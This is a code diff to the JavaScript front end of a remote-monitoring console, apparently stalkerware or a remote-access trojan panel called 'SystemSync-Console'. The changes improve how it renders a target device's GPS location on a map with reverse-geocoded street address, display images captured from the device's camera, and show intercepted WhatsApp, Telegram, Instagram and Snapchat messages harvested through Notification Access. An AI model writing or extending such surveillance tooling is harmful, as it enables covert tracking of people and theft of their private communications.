@@ -1168,10 +1168,11 @@
                 break;
                 
             case 'LOCATION_UPDATE':
-                renderMap(json.data);
+                // Handle both formats - direct object or nested in data
+                const locationData = json.data || json;
+                renderMap(locationData);
                 pendingCommand = null;
                 break;
-                
             case 'CAMERA_IMAGE':
                 displayCapturedImage(json.data);
                 pendingCommand = null;
@@ -1924,31 +1925,37 @@
     }
 
     function renderMap(loc) {
+        // Ensure loc has lat/lon
+        if (!loc || (typeof loc.lat === 'undefined' && typeof loc.latitude === 'undefined')) {
+            panel.innerHTML = '<p style="color:#d32f2f;">Invalid location data received</p>';
+            return;
+        }
+        
+        const lat = loc.lat || loc.latitude;
+        const lon = loc.lon || loc.longitude;
+        const accuracy = loc.accuracy || 10;
+        const provider = loc.provider || 'unknown';
+        
         panel.innerHTML = '<div id="map" style="position:relative; height:400px;"></div>';
         const mapDiv = document.getElementById('map');
-
+    
         const infoDiv = document.createElement('div');
         infoDiv.className = 'map-info';
         infoDiv.innerHTML = `
-            <div class="coord">📍 ${parseFloat(loc.lat).toFixed(6)}, ${parseFloat(loc.lon).toFixed(6)}</div>
-            <div>🎯 Accuracy: ${loc.accuracy ? parseFloat(loc.accuracy).toFixed(1) : '?'} m</div>
-            <div>📡 Provider: ${loc.provider || 'unknown'}</div>
+            <div class="coord">📍 ${parseFloat(lat).toFixed(6)}, ${parseFloat(lon).toFixed(6)}</div>
+            <div>🎯 Accuracy: ${parseFloat(accuracy).toFixed(1)} m</div>
+            <div>📡 Provider: ${provider}</div>
             <div class="addr">🌍 Loading address...</div>
         `;
         mapDiv.appendChild(infoDiv);
-
+    
         if (mapInstance) mapInstance.remove();
-        mapInstance = L.map(mapDiv).setView([loc.lat, loc.lon], 18);
+        mapInstance = L.map(mapDiv).setView([lat, lon], 18);
         L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(mapInstance);
-        L.circle([loc.lat, loc.lon], { radius: loc.accuracy || 10, color: '#1976ff' }).addTo(mapInstance);
-
-        const gfBtn = document.createElement('button');
-        gfBtn.textContent = '🗺️ Set Geofence Here';
-        gfBtn.style.cssText = 'margin-top:8px;padding:5px 12px;background:#4caf50;color:#fff;border:none;border-radius:6px;cursor:pointer;font-size:12px';
-        gfBtn.addEventListener('click', function() { useLocationAsGeofence(loc.lat, loc.lon); });
-        panel.appendChild(gfBtn);
-
-        fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${loc.lat}&lon=${loc.lon}&zoom=18&addressdetails=1`, {
+        L.circle([lat, lon], { radius: accuracy, color: '#1976ff' }).addTo(mapInstance);
+    
+        // Reverse geocoding
+        fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`, {
             headers: { 'User-Agent': 'SystemSync-Console/1.0' }
         })
         .then(response => response.json())
@@ -1960,7 +1967,7 @@
             console.error('Geocoding error:', err);
             infoDiv.querySelector('.addr').innerHTML = '🌍 Address unavailable';
         });
-    }
+}
 
     function renderTable() {
         if (!currentData || currentData.length === 0) {
@@ -2596,42 +2603,82 @@
     }
 
     function displaySocialMessages(data) {
-        const container = document.getElementById('socialMsgList') || panel;
-        container.innerHTML = '';
-        if (!Array.isArray(data) || data.length === 0) {
-            container.innerHTML = '<p style="color:#999;padding:16px 0">No messages found.</p>';
+    const container = document.getElementById('socialMsgList') || panel;
+    container.innerHTML = '';
+    
+    // Parse data if it's a string
+    let messages = data;
+    if (typeof data === 'string') {
+        try {
+            messages = JSON.parse(data);
+        } catch (e) {
+            console.error('Failed to parse social messages:', e);
+            container.innerHTML = '<p style="color:#999">Error parsing messages</p>';
             return;
         }
-        socialMsgsData = data;
-        renderSocialMessages(data);
     }
+    
+    if (!Array.isArray(messages) || messages.length === 0) {
+        container.innerHTML = '<p style="color:#999;padding:16px 0">No messages yet. Make sure Notification Access is enabled.</p>';
+        return;
+    }
+    
+    socialMsgsData = messages;
+    renderSocialMessages(messages);
+}
 
-    function renderSocialMessages(data) {
-        const container = document.getElementById('socialMsgList') || panel;
-        container.innerHTML = '';
-        data.forEach(function(n) {
-            const card = document.createElement('div');
-            card.dataset.pkg = n.pkg || n.packageName || '';
-            card.style.cssText = 'background:#fff;border:1px solid #e8e8e8;border-radius:10px;padding:12px;margin-bottom:8px';
-            const top = document.createElement('div');
-            top.style.cssText = 'display:flex;justify-content:space-between;align-items:center;margin-bottom:4px';
-            const appSpan = document.createElement('span');
-            appSpan.style.cssText = 'font-weight:700;font-size:13px;color:#1976ff';
-            appSpan.textContent = n.app || n.packageName || 'Unknown';
-            const timeSpan = document.createElement('span');
-            timeSpan.style.cssText = 'color:#aaa;font-size:11px';
-            timeSpan.textContent = n.timeFmt || n.date || '';
-            top.appendChild(appSpan); top.appendChild(timeSpan);
-            const sender = document.createElement('div');
-            sender.style.cssText = 'font-size:13px;font-weight:600;color:#333;margin-bottom:2px';
-            sender.textContent = n.sender || n.title || '';
-            const text = document.createElement('div');
-            text.style.cssText = 'font-size:13px;color:#555;line-height:1.4';
-            text.textContent = n.text || n.body || '';
-            card.appendChild(top); card.appendChild(sender); card.appendChild(text);
-            container.appendChild(card);
-        });
-    }
+function renderSocialMessages(data) {
+    const container = document.getElementById('socialMsgList') || panel;
+    container.innerHTML = '';
+    
+    data.slice().reverse().forEach(function(n) {
+        const card = document.createElement('div');
+        card.dataset.pkg = n.pkg || '';
+        card.style.cssText = 'background:#fff;border:1px solid #e8e8e8;border-radius:10px;padding:12px;margin-bottom:8px';
+        
+        const top = document.createElement('div');
+        top.style.cssText = 'display:flex;justify-content:space-between;align-items:center;margin-bottom:4px';
+        
+        const appSpan = document.createElement('span');
+        appSpan.style.cssText = 'font-weight:700;font-size:13px;color:#1976ff';
+        appSpan.textContent = n.app || getAppNameFromPkg(n.pkg) || 'Unknown';
+        
+        const timeSpan = document.createElement('span');
+        timeSpan.style.cssText = 'color:#aaa;font-size:11px';
+        timeSpan.textContent = n.timeFmt || n.time || '';
+        
+        top.appendChild(appSpan);
+        top.appendChild(timeSpan);
+        
+        const sender = document.createElement('div');
+        sender.style.cssText = 'font-size:13px;font-weight:600;color:#333;margin-bottom:2px';
+        sender.textContent = n.title || '';
+        
+        const text = document.createElement('div');
+        text.style.cssText = 'font-size:13px;color:#555;line-height:1.4';
+        text.textContent = n.text || n.body || '';
+        
+        card.appendChild(top);
+        card.appendChild(sender);
+        card.appendChild(text);
+        container.appendChild(card);
+    });
+}
+
+function getAppNameFromPkg(pkg) {
+    const map = {
+        'com.whatsapp': 'WhatsApp',
+        'org.telegram.messenger': 'Telegram',
+        'com.instagram.android': 'Instagram',
+        'com.facebook.orca': 'Messenger',
+        'com.facebook.katana': 'Facebook',
+        'com.snapchat.android': 'Snapchat',
+        'com.twitter.android': 'Twitter',
+        'com.viber.voip': 'Viber',
+        'com.skype.raider': 'Skype'
+    };
+    return map[pkg] || pkg;
+}
 
     function filterSocialByPkg(pkg) {
         if (!socialMsgsData.length) return;
